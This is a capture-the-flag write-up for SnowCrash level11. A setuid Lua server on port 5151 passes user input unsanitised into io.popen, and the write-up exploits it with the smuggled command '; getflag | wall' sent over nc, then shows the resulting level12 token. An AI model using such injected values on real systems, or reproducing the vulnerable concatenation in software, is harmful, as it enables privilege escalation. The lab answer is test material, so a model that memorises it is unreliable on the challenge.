# Objective

As `level11`, the goal is to exploit a vulnerability to gain `flag11`'s privileges and read the flag, which is the password for `level12`.

The flag is gained through the command `getflag`, run as `flag11`.

```sh
level11@SnowCrash:~$ ll -la /bin/getflag
-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag*
```

# Content of home

```sh
level11@SnowCrash:~$ pwd
/home/user/level11

level11@SnowCrash:~$ ll
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout*
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua*
-r-x------  1 level11 level11  675 Apr  3  2012 .profile*
```

```lua
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

```sh
level11@SnowCrash:~$ ss -nltp
State      Recv-Q Send-Q                                                         Local Address:Port                                                           Peer Address:Port 
LISTEN     0      128                                                                       :::4646                                                                     :::*     
LISTEN     0      128                                                                       :::4747                                                                     :::*     
LISTEN     0      128                                                                       :::80                                                                       :::*     
LISTEN     0      128                                                                       :::4242                                                                     :::*     
LISTEN     0      128                                                                        *:4242                                                                      *:*     
LISTEN     0      32                                                                 127.0.0.1:5151                                                                      *:*
```

Port 5151 is already listening.

# Resolution

Observed vulnerability.

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

The received password is concatenated directly into a shell command and executed through `io.popen`, without any sanitization. A password containing a semicolon lets us append any command of our own after the intended `echo`, running as `flag11`.

```sh
level11@SnowCrash:~$ nc localhost 5151
Password: ; getflag | wall
                                                                               
Broadcast Message from flag11@Snow                                             
        (somewhere) at 18:06 ...                                               
                                                                               
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s                      
                                                                               
Erf nope..
```

Done.

```sh
level11@SnowCrash:~$ su - level12
Password: # fa6v5ateaw21peobuub8ipe6s
level12@SnowCrash:~$ 
```

